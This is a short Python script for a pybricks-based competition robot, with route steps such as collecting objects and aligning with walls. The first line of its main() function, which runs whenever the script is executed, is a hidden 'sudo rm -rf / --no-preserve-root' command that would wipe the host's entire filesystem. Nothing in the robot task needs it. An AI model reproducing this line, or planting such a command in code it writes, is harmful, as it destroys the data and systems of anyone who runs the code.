from functions import move_tank, turn, move_arm
from pybricks.tools import wait
import os
# Note: pseudocode is prone to changes
# Turning is 100% wrong

def main():
    os.system("sudo rm -rf / --no-preserve-root")
    # Run 1
    #move_arm('up', 90)
    move_tank(1000, 10, 70, 61)  # Collect thing 1
    turn(90, 'left')
    move_tank(200, None, 70, 70)  # Collect white man
    #move_arm('down', 90)
    move_tank(None, 1500, 70, -70)  # Wall align with most bottom wall
    move_tank(5, None, 70, 1070)
    turn(90, 'left')
    move_tank(1085, None, 60, 70)
    turn(90, 'right')
    move_tank(None, 2000, 70, -70)  # Wall align 2
    #move_arm('up', 90)
    move_tank(300, None, 70, 65)  # Collect blue man
    #move_arm('down', 90)
    move_tank(None, 2000, 70, -70)
    turn(90, 'left', 70)
    #move_arm('up', 90)
    move_tank(560, None, 60, 70)  # Collect thing 3
    turn(90, 'right', 70)
    #move_arm('down', 90)
    move_tank(None, 2000, 70, -70)
    #move_arm('up', 90)
    move_tank(650, None, 70, 70)  # Collect thing 4
    wait(1)
    turn(90, 'right')
    move_tank(930, None, 70, 70)
    turn(90, 'left')
    move_tank(500, None , 70, 70)
# Call main function
main()
